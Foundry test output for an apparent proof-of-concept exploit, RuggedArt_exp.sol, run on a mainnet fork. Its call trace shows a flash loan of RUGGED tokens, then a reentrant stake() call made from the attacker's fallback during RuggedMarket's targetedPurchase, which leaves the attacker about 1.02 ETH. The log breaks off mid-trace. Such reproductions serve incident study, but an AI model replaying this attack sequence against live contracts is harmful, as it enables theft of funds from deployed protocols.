No files changed, compilation skipped

Ran 1 test for test/RuggedArt_exp.sol:ContractTest
[PASS] testExploit() (gas: 7102116)
Logs:
  Attacker Eth balance before attack:: 0
  Attacker Eth balance after attack:: 1023851896415447765

Traces:
  [19491] ContractTest::setUp()
    ├─ [0] VM::createSelectFork("mainnet", 19262233 [1.926e7])
    │   └─ ← [Return] 0
    ├─ [0] VM::label(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], "proxy")
    │   └─ ← [Return]
    ├─ [0] VM::label(RUGGED: [0xbE33F57f41a20b2f00DEc91DcC1169597f36221F], "RUGGED")
    │   └─ ← [Return]
    ├─ [0] VM::label(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5], "pool")
    │   └─ ← [Return]
    ├─ [0] VM::label(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], "WETH")
    │   └─ ← [Return]
    ├─ [0] VM::label(RuggedMarket: [0xFe380fe1DB07e531E3519b9AE3EA9f7888CE20C6], "RuggedMarket")
    │   └─ ← [Return]
    ├─ [0] VM::label(Universal_Router: [0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD], "Universal_Router")
    │   └─ ← [Return]
    └─ ← [Stop]

  [8882910] ContractTest::testExploit()
    ├─ [2534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] 0x0000000000000000000000000000000000000000::fallback()
    │   └─ ← [Stop]
    ├─ [0] VM::deal(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    │   └─ ← [Return]
    ├─ [534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "Attacker Eth balance before attack:", val: 0)
    ├─ [8216165] pool::flash(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 22000000000000000000 [2.2e19], 0, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [2630] RUGGED::balanceOf(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5]) [staticcall]
    │   │   └─ ← [Return] 356565570739218611936 [3.565e20]
    │   ├─ [2534] WETH::balanceOf(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5]) [staticcall]
    │   │   └─ ← [Return] 21357138155001948655 [2.135e19]
    │   ├─ [2315335] RUGGED::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 22000000000000000000 [2.2e19])
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9159)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9004)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3270)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 8866)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 347)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9050)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3033)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 41)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7485)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9192)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 1933)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9017)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7093)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4090)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3525)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3978)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4984)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7449)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3913)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 6049)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 8796)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4903)
    │   │   ├─ emit ERC20Transfer(from: pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 22000000000000000000 [2.2e19])
    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4209: 4903 → 5943
    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb3e65: 9004 → 715
    │   │   │   @ 0x278f4573a69e3831cd8adb28e1f945e081534e9d1c9b485ab956be05d3187cd6: 0 → 1
    │   │   │   @ 0x4d4695fd027810f7d8a51d8c6d12aaac78b91258cb3f49850c4ffea388e3b005: 0 → 19
    │   │   │   @ 0x6fe927c728cb1a50914fc42111657f0cb05320d84f4bf69c230741967e26adee: 0 → 1
    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4a56: 9192 → 5744
    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9c: 0 → 4984
    │   │   │   @ 0x5d4e160575fee9c3345b17a5540abdd97c833048d80099370b0a86e8fdb4ca4b: 0 → 1
    │   │   │   @ 0x36bb8b7d694abd1ddcfd6ad0e40c7f1bb98463dfcb3f63c4d8ea061ef08403b2: 0 → 11
    │   │   │   @ 0x4a86c16f9f4d8ddc461d66e4f2f711659d32a2de536944ecd4866011e4888dfb: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   @ 0xf628b9f41573c0b9c087365a59c95440d0d7bba73f05e58e6c4ebc7a1d5cd252: 0 → 1
    │   │   │   @ 0xff84529e16e49c94f43586df550f0114053b5c9adb3205d522559199b3b6401b: 0 → 1
    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4ea1: 6749 → 0
    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb408d: 8866 → 643
    │   │   │   @ 0xdbdc55d7621c6061576ada6656295ae01b65e3eb3f1854f3486f5ce65e3c82d2: 0 → 18
    │   │   │   @ 0x28cc13b836cf79b3fcf55dfa84c4ced0b94e65e4229aa224d49c90a40eac8b2c: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4ea4: 8174 → 0
    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e92: 6452 → 0
    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e9b: 5669 → 0
    │   │   │   @ 0x0e7db45edec961ebbfe5c90b251b8e1b57ac28de641a068a5f6ce9333a19a77f: 0 → 1
    │   │   │   @ 0x4ab23ed1f83872b0a45de39f6ed7d229ae280f63ff22205982744af85aa148b3: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   @ 0xf2fd03ad4e254bdad2fe17ba09af9c75d08a7fa2e857461c6471ddf929e5138a: 0 → 1
    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da0: 0 → 8796
    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb49b3: 7485 → 6570
    │   │   │   @ 0xc75099ea203e179b5fed28a847cb830059ddef10f334d856ccf9250c338c1258: 0 → 4
    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e9c: 6719 → 0
    │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0 → 0x000000000000000000000000000000000000000000000001314fb37062980000
    │   │   │   @ 0xa48a0046b556202b266997a920608b4f973032aebfea8fee20d7369d2c10eeb7: 0 → 1
    │   │   │   @ 0x2d015ef0357f85f216b2e8c1b54273d960fdb9b3d9f4e846e824345a939f94aa: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   └─ ← [Return] true
    │   ├─ [5869810] ContractTest::uniswapV3FlashCallback(66000000000000000 [6.6e16], 0, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   │   ├─ [45483] proxy::claimReward()
    │   │   │   ├─ [40593] RuggedMarket::claimReward() [delegatecall]
    │   │   │   │   ├─  storage changes:
    │   │   │   │   │   @ 4: 0x0000000000000000000000000000000000000000000000000000000b57b47dd2 → 0x0000000000000000000000000000000000000000000000000000000b596319c5
    │   │   │   │   │   @ 0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ad1: 0x00000000000000000000000000000000000000000000000047814665d40d783d → 0x00000000000000000000000000000000000000000000000047b4978b20243f59
    │   │   │   │   │   @ 6: 0x0000000000000000000000000000000000000000000000000000000065d35c7b → 0x0000000000000000000000000000000000000000000000000000000065d35eeb
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [3446361] proxy::targetedPurchase{value: 1}([9721, 5163, 2347, 3145, 2740, 1878, 6901, 3061, 1922, 5301, 454, 2178, 8298, 4825, 9307, 2628, 6115, 8565, 7991, 4945], UniversalRouterExecute({ commands: 0x04, inputs: [0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000000001], deadline: 1708351211 [1.708e9] }))
    │   │   │   ├─ [3445774] RuggedMarket::targetedPurchase{value: 1}([9721, 5163, 2347, 3145, 2740, 1878, 6901, 3061, 1922, 5301, 454, 2178, 8298, 4825, 9307, 2628, 6115, 8565, 7991, 4945], UniversalRouterExecute({ commands: 0x04, inputs: [0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000000001], deadline: 1708351211 [1.708e9] })) [delegatecall]
    │   │   │   │   ├─ [2630] RUGGED::balanceOf(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 511846574232226400833 [5.118e20]
    │   │   │   │   ├─ [2422527] Universal_Router::execute{value: 1}(0x04, [0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000000001], 1708351211 [1.708e9])
    │   │   │   │   │   ├─ [2408770] ContractTest::fallback{value: 1}()
    │   │   │   │   │   │   ├─ [24681] RUGGED::approve(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   │   │   @ 0x8f6d89859724fe34852060bef98eb0f60226cb89e3c5ecd5a5a51b9cb0df329d: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   ├─ [630] RUGGED::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 22000000000000000000 [2.2e19]
    │   │   │   │   │   │   ├─ [2378807] proxy::stake(22000000000000000000 [2.2e19])
    │   │   │   │   │   │   │   ├─ [2378417] RuggedMarket::stake(22000000000000000000 [2.2e19]) [delegatecall]
    │   │   │   │   │   │   │   │   ├─ [2325542] RUGGED::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], 22000000000000000000 [2.2e19])
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 4903)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 8796)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 6049)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 3913)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 7449)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 4984)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 3978)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 3525)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 4090)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 7093)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 9017)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 1933)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 9192)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 7485)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 41)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 3033)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 9050)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 347)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 8866)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 3270)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 9004)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 9159)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 358)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 643)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 5045)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 1168)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 5153)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 8137)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 4842)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 2507)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 6356)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 7859)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 5862)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 7605)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 736)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 5507)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 942)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 1549)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 3951)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 6652)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 8418)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 6614)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 5010)
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 7314)
    │   │   │   │   │   │   │   │   │   ├─ emit ERC20Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], amount: 22000000000000000000 [2.2e19])
    │   │   │   │   │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   │   │   │   │   @ 0x36822dd15940f1efccfbc62c0ff56967efaf9783a99f51ad14a05140cb0a430b: 1 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x36bb8b7d694abd1ddcfd6ad0e40c7f1bb98463dfcb3f63c4d8ea061ef08403b2: 11 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0xf853896e04fb6beb93d833844d863061a0341bffbc06e50ef88896dcb9648a2a: 3 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x4d4d0ea6828e6cfadf573d00ca0ceecd1b88d8fe03738c680525933a0c6566d2: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x2bf44c59b7dfa0b983853ab9a9df75d73a6c3f25f352c17ef5841d15c33e5a8d: 13 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x4ab23ed1f83872b0a45de39f6ed7d229ae280f63ff22205982744af85aa148b3: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0xa2fc26c823cf110ed3d127efc4512827e69c220798d62758e9566c0e0d9ddfbc: 0 → 1
    │   │   │   │   │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x000000000000000000000000000000000000000000000001314fb37062980000 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0xd688421fed0da63bb41748eaebc09adf1b400e13d1eadd1583aaef2e7b2c03cf: 6 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 511 → 533
    │   │   │   │   │   │   │   │   │   │   @ 0xe7ce429ac7a3c0c4496332bad5eb5dffe331e40b2a4c50def06dcc0d6027a874: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d8d: 9004 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x852ad12a00fde3f2222effa6c54953732fa0c605b80022916d85aabff4788b60: 0 → 520
    │   │   │   │   │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606ea: 0 → 736
    │   │   │   │   │   │   │   │   │   │   @ 0xa5b58a888a85842b891a760e4c76260aeafebf6e5cba275046506c0ed4973e49: 0 → 526
    │   │   │   │   │   │   │   │   │   │   @ 0x969cdb32f670ea09030ac7e1917768e8465670b5835811b4148238023de63974: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
    │   │   │   │   │   │   │   │   │   │   @ 0x16d4236f8135b486684a8fac3481a9cf3bb5748669ffb02a03afa726d60d00f8: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x7eca25646d77fbe48d97efe900eaf35453ca5066c6465950256408bb31a48a1b: 15 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x4a86c16f9f4d8ddc461d66e4f2f711659d32a2de536944ecd4866011e4888dfb: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x509055df01107bc64af72dc08330b9397ce32ea3183e634e399c3833b7aa595e: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x6ac42465a8b4c0f32b318bd6a8f0b22cdc01505097dac159adad5ddc02c3cd21: 1 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606e2: 0 → 5153
    │   │   │   │   │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb414d: 3951 → 4984
    │   │   │   │   │   │   │   │   │   │   @ 0x9ae033293df4dab32d5c97677a4d1db599ce5cc1a07073bdfe4cddecf372b28b: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
    │   │   │   │   │   │   │   │   │   │   @ 0xd609a12af96f381f54941be9dcd7bbee7751067de615944a5b44d4a5ef7da0ff: 0 → 528
